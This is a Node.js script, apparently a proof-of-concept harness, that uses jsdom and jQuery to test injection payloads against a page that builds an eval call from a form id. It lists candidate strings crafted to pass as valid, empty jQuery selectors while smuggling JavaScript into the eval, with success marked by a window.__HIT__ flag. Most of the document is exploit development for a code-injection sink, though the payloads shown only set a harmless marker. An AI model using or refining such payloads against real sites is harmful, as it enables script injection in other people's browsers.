const fs = require("fs");
const { JSDOM } = require("jsdom");
const jquerySrc = fs.readFileSync(__dirname + "/node_modules/jquery/dist/jquery.js", "utf8");

function test(format) {
  const html = `<!DOCTYPE html><html><body>
  <form id="poly_x" data-formula="x+y">
    <input id="x_standard" name="x" value="1"><input id="y_standard" name="y" value="2">
    <input name="formula" value="x+y"><div id="template_standard" hidden>t</div>
  </form><pre id="answer"></pre></body></html>`;
  const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true });
  const { window } = dom;
  const s = window.document.createElement("script"); s.textContent = jquerySrc; window.document.head.appendChild(s);
  const $ = window.$;
  const form = window.document.querySelector("form");
  form.id = "poly_" + format;
  const selected = form.id.replace("poly_", "");
  let res = { format, selThrew:false, selLen:null, evalRan:false, hit:false, err:null };
  try {
    const t = $("#template_" + selected);
    res.selLen = t.length;
    if (t.length === 0) {
      window.__HIT__ = false;
      window.type_standard = function(){ return "SAFE"; };
      // faithful eval in window scope with type_standard, this=form, selected
      try {
        window.eval("(function(){ var selected=" + JSON.stringify(selected) + "; " +
                    "return eval('type_'+selected+'(this, selected)'); }).call(document.querySelector('form'))");
        res.evalRan = true; res.hit = !!window.__HIT__;
      } catch(e){ res.evalErr = e.message; }
    }
  } catch(e){ res.selThrew = true; res.err = e.message.split("\n")[0]; }
  return res;
}

// Candidates: need selector valid+empty AND eval runs window.__HIT__=true
const cands = [
  "standard",                                   // baseline safe
  "standard\\3b window.__HIT__=true//",          // CSS escaped ;  -> selector? 
  "standard,x;window.__HIT__=true//",            // grouping comma
  "standard[x=y]&&(window.__HIT__=true)//",      // attr selector + &&
  "standard[x]||(window.__HIT__=true)//",
  "$&&(window.__HIT__=true)//",
  "\\.constructor",                              
  "standard/**/;window.__HIT__=true//",
];
for (const c of cands) {
  try { console.log(JSON.stringify(test(c))); }
  catch(e){ console.log(JSON.stringify({format:c, fatal:e.message.split("\n")[0]})); }
}
